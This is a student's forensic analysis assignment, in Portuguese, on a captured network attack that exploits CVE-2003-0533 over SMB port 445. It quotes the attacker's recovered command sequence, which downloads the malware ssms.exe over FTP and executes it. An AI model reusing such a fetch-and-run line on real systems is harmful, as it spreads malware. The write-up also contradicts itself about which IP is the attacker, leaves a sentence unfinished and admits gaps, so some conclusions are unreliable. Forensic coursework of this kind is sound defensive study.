---
title: Trabalho 4
subtitle: Segurança
author: Iago Mello Floriano 
date: GRR20196049
---

## Questão 1) quais são os ips envolvidos

Usando o seguinte comando

`$ tcpdump -n -r attack-trace.pcap | cut -d' ' -f3,5 | sed -e 's/ /\n/g' | cut -d. -f-4 | sort -u`

Foi possível ver que se tem 2 ips

```
reading from file attack-trace.pcap, link-type EN10MB (Ethernet), snapshot length 65535
192.150.11.111
98.114.205.102
```

## Questão 2) o que da para saber sobre a máquina do atacante? (ex.: lugar?)

Assumindo que o atacante que inicia a conexão, temos que o ip 192.150.11.111 é o atacante
(possível ver pelo tcpdump. Com isso rodando `whois 98.114.205.102` conseguimos diversas
informações sobre ele.

```
#
# ARIN WHOIS data and services are subject to the Terms of Use
# available at: https://www.arin.net/resources/registry/whois/tou/
#
# If you see inaccuracies in the results, please report at
# https://www.arin.net/resources/registry/whois/inaccuracy_reporting/
#
# Copyright 1997-2023, American Registry for Internet Numbers, Ltd.
#


NetRange:       98.108.0.0 - 98.119.255.255
CIDR:           98.112.0.0/13, 98.108.0.0/14
NetName:        VIS-BLOCK
NetHandle:      NET-98-108-0-0-1
Parent:         NET98 (NET-98-0-0-0-0)
NetType:        Direct Allocation
OriginAS:       
Organization:   Verizon Business (MCICS)
RegDate:        2008-04-02
Updated:        2022-05-31
Ref:            https://rdap.arin.net/registry/ip/98.108.0.0



OrgName:        Verizon Business
OrgId:          MCICS
Address:        22001 Loudoun County Pkwy
City:           Ashburn
StateProv:      VA
PostalCode:     20147
Country:        US
RegDate:        2006-05-30
Updated:        2022-10-11
Ref:            https://rdap.arin.net/registry/entity/MCICS


OrgTechHandle: JEYAK-ARIN
OrgTechName:   Jeyakumar, Jebaraj 
OrgTechPhone:  +1-919-378-7285 
OrgTechEmail:  jebaraj.kennet@verizon.com
OrgTechRef:    https://rdap.arin.net/registry/entity/JEYAK-ARIN

OrgDNSHandle: VZDNS1-ARIN
OrgDNSName:   VZ-DNSADMIN
OrgDNSPhone:  +1-800-900-0241 
OrgDNSEmail:  dnsadmin@verizon.com
OrgDNSRef:    https://rdap.arin.net/registry/entity/VZDNS1-ARIN

OrgRoutingHandle: JEYAK-ARIN
OrgRoutingName:   Jeyakumar, Jebaraj 
OrgRoutingPhone:  +1-919-378-7285 
OrgRoutingEmail:  jebaraj.kennet@verizon.com
OrgRoutingRef:    https://rdap.arin.net/registry/entity/JEYAK-ARIN

OrgTechHandle: SWIPP-ARIN
OrgTechName:   swipper
OrgTechPhone:  +1-800-900-0241 
OrgTechEmail:  swipper@verizonbusiness.com
OrgTechRef:    https://rdap.arin.net/registry/entity/SWIPP-ARIN

OrgDNSHandle: KBR27-ARIN
OrgDNSName:   Reeb, Ken B.
OrgDNSPhone:  +1-800-900-0241 
OrgDNSEmail:  Kenneth.Reeb@verizonwireless.com
OrgDNSRef:    https://rdap.arin.net/registry/entity/KBR27-ARIN

OrgAbuseHandle: ABUSE3-ARIN
OrgAbuseName:   abuse
OrgAbusePhone:  +1-800-900-0241 
OrgAbuseEmail:  abuse-mail@verizonbusiness.com
OrgAbuseRef:    https://rdap.arin.net/registry/entity/ABUSE3-ARIN

OrgAbuseHandle: ABUSE5603-ARIN
OrgAbuseName:   Abuse
OrgAbusePhone:  +1-800-900-0241 
OrgAbuseEmail:  abuse@verizon.net
OrgAbuseRef:    https://rdap.arin.net/registry/entity/ABUSE5603-ARIN

OrgTechHandle: SWIPP9-ARIN
OrgTechName:   SWIPPER
OrgTechPhone:  +1-800-900-0241 
OrgTechEmail:  swipper@verizonbusiness.com
OrgTechRef:    https://rdap.arin.net/registry/entity/SWIPP9-ARIN

RAbuseHandle: ABUSE5603-ARIN
RAbuseName:   Abuse
RAbusePhone:  +1-800-900-0241 
RAbuseEmail:  abuse@verizon.net
RAbuseRef:    https://rdap.arin.net/registry/entity/ABUSE5603-ARIN


#
# ARIN WHOIS data and services are subject to the Terms of Use
# available at: https://www.arin.net/resources/registry/whois/tou/
#
# If you see inaccuracies in the results, please report at
# https://www.arin.net/resources/registry/whois/inaccuracy_reporting/
#
# Copyright 1997-2023, American Registry for Internet Numbers, Ltd.
#
```

Uma das informações importantes que esse comando nos trás é, por exemplo, o local:
```
Address:        22001 Loudoun County Pkwy
City:           Ashburn
```

## Questão 3) quantas sessões tcp tem no arquivo?

Rodando o comando `p0f -r attack-trace.pcap | grep "syn+ack"`
conseguimos ver todas as mensagens do tipo syn que obtiveram resposta ack:

```
.-[ 98.114.205.102/1821 -> 192.150.11.111/445 (syn+ack) ]-
.-[ 98.114.205.102/1828 -> 192.150.11.111/445 (syn+ack) ]-
.-[ 98.114.205.102/1924 -> 192.150.11.111/1957 (syn+ack) ]-
.-[ 192.150.11.111/36296 -> 98.114.205.102/8884 (syn+ack) ]-
.-[ 98.114.205.102/2152 -> 192.150.11.111/1080 (syn+ack) ]-
```

Dessa forma conseguimos contar que são 5 sessões tcp no total

## Questão 4) quanto tempo o atacante levou?

Com o comando `tcpdump -n -r attack-trace.pcap | cut -d' ' -f1 | head -n 1`:
```
reading from file attack-trace.pcap, link-type EN10MB (Ethernet), snapshot length 65535
00:28:28.374595
```
Podemos observar que o ataque se deu inicio aos 28 minutos 28 segundos e 374595 milissegundos

E com o comando `tcpdump -n -r attack-trace.pcap | cut -d' ' -f1 | tail -n 1`
```
reading from file attack-trace.pcap, link-type EN10MB (Ethernet), snapshot length 65535
00:28:44.593813
```
Podemos observar que o ataque terminou aos 28 minutos 44 segundos e 593813 milissegundos

Com isso temos que o ataque demorou aproximadamente 16 segundos.

## Questão 5) Qual sistema operacional foi alvo do ataque? Qual o serviço atacado? Qual a vulnerabilidade explorada?

Tendo o ip `98.114.205.102` como atacante, podemos ver essa conexão feita usando o comando
`p0f -r attack-trace.pcap`:
```
.-[ 98.114.205.102/1821 -> 192.150.11.111/445 (syn+ack) ]-
|
| server   = 192.150.11.111/445
| os       = Linux 2.4-2.6
| dist     = 0
| params   = none
| raw_sig  = 4:64+0:0:1460:mss*4,0:mss,nop,nop,sok:df:0
|
`----
```
Ou seja o sistema atacado é linux.

Temos também o seguinte pacote:
```
.-[ 98.114.205.102/1828 -> 192.150.11.111/445 (syn) ]-
|
| client   = 98.114.205.102/1828
| os       = Windows NT kernel
| dist     = 15
| params   = generic
| raw_sig  = 4:113+15:0:1460:mss*44,0:mss,nop,nop,sok:df,id+:0
|
`----
```
Com qual podemos ver que o atacante está tentando explorar alguma vulnerabilidade do
windows

Como sabemos que a vítima deveria ser uma máquina windows, o atacante está tentando atacar
alguma vulnerabilidade do Microsoft-DS Active Directory, Windows shares, já que está
atacando a porta 445. Pesquisando mais sobre o 

## Questão 6) Esboce graficamente uma visão geral das ações realizadas pelo atacante (considere a topologia de rede, os passos do ataque, os resultados).

1. Atacante identifica que a porta 445 da vítima está aberta
2. Atacante estabelece uma sessão com usuário NULL.
3. Atacante explora a vulnerabilidade usando a função DsRoleUpgradeDownlevelServer() (
visível nos pacotes pelo tcpdump) passando como parâmetro o código malicioso.
4. Código malicioso inicia conexão na porta 1957
5. Atacante se conecta a essa porta e faz o download do malware na máquina da vítima.
possível ver com essa sequência de comandos `tcpflow -r attack-trace.pcap; file *; less 
098.114.205.102.01924-192.150.011.111.01957`. O malware foi baixado com o seguinte comando
`echo open 0.0.0.0 8884 > o&
echo user 1 1 >> o &
echo get ssms.exe >> o &
echo quit >> o &
ftp -n -s:o &
del /F /Q o &ssms.exe`
6. Atacante executa malware na máquina da vítima.

## Questão 7) Que vulnerabilidade específica foi explorada (CVE, propriedades de segurança violadas, como ela ocorre, etc.)?

Foi explorada a vulnerabilidade CVE-2003-0533. A vulnerabilidade consiste em um stack 
overflow em algumas funções do serviço explorado. Executando uma função específica é
possível o atacante executar um código malicioso no sistema da vítima. Esse ataque viola
o princípio da integridade, já que executa um código sem autorização.

## Questão 8) O que a shellcode faz? Liste a shellcode (código).

Muito provável que a shellcode faça um tcp reverso, já que após algumas mensagens da forma
`atacante -> vítima` começam a ser feitas mensagens da forma `vítima -> atacante`,
incluindo um início de sessão tcp (syn, syn ack, ack).

Não consegui obter o shellcode em si, mas sei que é possível obte-lo a partir da saída do
comando `tcpdump -vvv -n -r attack-trace.pcap`.

## Questão 9) Você acha que um honeypot foi utilizado para se passar por vítima vulnerável? Justifique.

Acho que sim, já que o serviço atacado é de uma máquina windows e o p0f acusa a vítima ser
uma máquina linux, assim fomentando a teoria de ser uma máquina linux com uma máquina
virtual windows de honeypot.

## Questão 10) Houve código malicioso envolvido? Se sim, qual o nome/rótulo do malware?

Sim. Foi descoberto o ssms.exe nas questões anteriores. Esse código sendo o malware.

## Questão 11) Você acha que o ataque foi manual ou lançado de maneira automática? Justifique sua resposta.

Dado que o tempo de execução do ataque foi somente 16 segundos, acho que o ataque foi
lançado de forma automática.



Obs. Não fiz a matéria de redes 2, então algumas informações podem estar incorretas ou
faltando.
